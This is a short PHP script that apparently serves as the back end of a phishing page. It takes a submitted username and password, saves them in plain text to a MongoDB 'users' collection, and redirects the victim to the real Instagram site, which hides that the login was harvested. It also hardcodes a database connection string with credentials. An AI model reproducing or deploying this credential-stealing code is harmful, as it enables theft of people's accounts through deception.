<?php
session_start();

// -----------------------
// ✅ 1. MongoDB CONFIG
// -----------------------
require __DIR__ . '/vendor/autoload.php'; // MongoDB PHP library

$mongoURI = "mongodb+srv://imanetidjani:yghcbv@cluster0.apc6t.mongodb.net/security?retryWrites=true&w=majority&appName=Cluster0"; 
// Example:
// mongodb+srv://imanetidjani:Password123@cluster0.apc6t.mongodb.net/security?retryWrites=true&w=majority&appName=Cluster0

try {
    $client = new MongoDB\Client($mongoURI);
    $db = $client->security;       // database
    $collection = $db->users;      // collection (like table)

} catch (Exception $e) {
    die("MongoDB connection failed: " . $e->getMessage());
}


// -----------------------
// ✅ 2. Handle form POST
// -----------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $email = isset($_POST['username']) ? trim($_POST['username']) : "";
    $password = isset($_POST['password']) ? trim($_POST['password']) : "";

    if (empty($email) || empty($password)) {
        die("Please fill in all fields.");
    }

    try {
        // ✅ Insert user into MongoDB
        $collection->insertOne([
            "email" => $email,
            "password" => $password,
            "created_at" => date("Y-m-d H:i:s")
        ]);

        // ✅ Session
        $_SESSION['email'] = $email;

        // ✅ Redirect
        header("Location: https://instagram.com");
        exit;

    } catch (Exception $e) {
        die("Database error: " . $e->getMessage());
    }
} else {
    header("Location: index.php");
    exit;
}
?>
